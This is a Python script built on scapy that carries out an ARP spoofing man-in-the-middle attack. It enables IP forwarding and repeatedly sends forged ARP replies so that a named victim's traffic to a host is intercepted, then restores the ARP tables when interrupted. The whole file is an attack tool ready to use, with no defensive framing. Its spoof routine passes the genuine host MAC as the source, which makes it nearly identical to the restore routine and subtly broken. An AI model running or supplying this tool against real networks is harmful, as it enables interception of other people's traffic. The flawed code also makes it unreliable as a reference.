import argparse
import subprocess
import time
from scapy.all import ARP, Ether, srp, send

def enable_ip_forwarding():
    """Enables IP forwarding on the system"""
    try:
        subprocess.run(["sysctl", "net.ipv4.ip_forward=1"], check=True)
        print("IP forwarding enabled successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Error enabling IP forwarding: {e}")

def get_mac(ip):
    """Returns MAC address of a device with the given IP"""
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

def spoof(target_ip, host_ip, verbose=True):
    """Spoofs ARP responses to trick target into sending packets to attacker"""
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op='is-at')
    send(arp_response, verbose=0)

    if verbose:
        print(f"[+] Sent ARP response: {host_ip} is-at {host_mac} to {target_ip}")

def restore(target_ip, host_ip, verbose=True):
    """Restores ARP table entry of target with original values"""
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)

    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op='is-at')
    send(arp_response, verbose=0, count=7)

    if verbose:
        print(f"[+] Restored ARP entry for {target_ip} with original MAC address {target_mac}")

def arpspoof(target, host, verbose=True):
    """Performs ARP spoofing attack"""
    enable_ip_forwarding()

    try:
        while True:
            spoof(target, host, verbose)
            spoof(host, target, verbose)
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C! Restoring the network, please wait...")
        restore(target, host)
        restore(host, target)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP spoof script")
    parser.add_argument("target", help="Victim IP Address to ARP poison")
    parser.add_argument("host", help="Host IP Address, the host you wish to intercept packets")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    args = parser.parse_args()

    arpspoof(args.target, args.host, args.verbose)
